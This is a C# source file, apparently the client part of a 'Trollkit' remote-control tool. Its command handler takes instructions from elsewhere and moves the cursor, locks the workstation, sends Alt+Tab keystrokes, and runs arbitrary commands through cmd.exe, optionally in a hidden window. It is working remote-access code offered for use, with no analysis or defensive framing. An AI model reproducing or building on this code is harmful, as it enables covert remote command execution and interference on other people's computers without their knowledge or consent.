using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
    public class WindowsHandler : ICommandHandler
    {
		[DllImport("user32.dll")]
		public static extern bool LockWorkStation();
		public bool HandleCommand(TransferCommandObject obj)
        {
			switch (obj.Command)
			{
				case "MousePosition":
					MousePosition(obj.Value);
					return true;
				case "Command":
					RunCommand(obj.Value);
					return true;
				case "LockWindows":
					LockWorkStation();
					return true;
				case "AltTab":
					AltTab();
					return true;
			}

			return false;
		}

		private void MousePosition(string coordinates)
		{
			string[] values = coordinates.Split(',');
			Cursor.Position = new Point(int.Parse(values[0]), int.Parse(values[1]));
		}

		private void RunCommand(string command)
		{
			string[] values = command.Split(',');
			if (values[1] == "hidden")
			{
				System.Diagnostics.Process process = new System.Diagnostics.Process();
				System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.Arguments = $"/C {command}";
				process.StartInfo = startInfo;
				process.Start();
			}
			else if (values[1] == "show")
			{
				System.Diagnostics.Process.Start("CMD.exe", $"/C {command} & pause");
			}
			else
			{ 
			
			}

			//test command = explorer https://google.com
		}

		private void AltTab()
		{
			Random number = new Random();
			Keyboard keyboard = new Keyboard();
			keyboard.Send(Keyboard.ScanCodeShort.MENU);
			keyboard.Send(Keyboard.ScanCodeShort.TAB);
			for (int i = 0; i < number.Next(2, 7); i++)
			{
				Thread.Sleep(10);
				keyboard.Send(Keyboard.ScanCodeShort.TAB);
			}
			keyboard.release(Keyboard.ScanCodeShort.MENU);
			keyboard.release(Keyboard.ScanCodeShort.TAB);

		}

	
    }
}
